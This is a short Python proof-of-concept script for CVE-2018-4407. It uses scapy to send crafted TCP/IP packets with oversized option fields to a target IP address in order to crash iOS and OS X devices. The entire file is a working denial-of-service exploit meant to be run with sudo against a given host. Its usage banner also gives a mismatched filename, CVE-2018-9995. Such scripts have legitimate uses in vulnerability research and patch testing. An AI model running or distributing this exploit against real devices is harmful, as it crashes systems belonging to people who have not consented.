#!/usr/bin/env python3
# CVE-2018-4407-PoC

from scapy.all import *
import sys

if len(sys.argv) < 2:
    print("""
    CVE-2018-9995_PoC.py
    Crash iOS and OS X devices (CVE-2018-4407 PoC)
    usage:
        sudo python3 CVE-2018-4407_PoC.py <target_ip>
    e.g.
        sudo python3 CVE-2018-4407_PoC.py 192.168.0.103
        """)
else:
    ip = sys.argv[1]
    datagram = TCP(dport=2323, options=[(19, "1"*18), (19, "2"*18)])
    for i in range(8,20):
        packet = IP(dst = ip, options=[IPOption("A"*i)])
        send(packet/datagram)
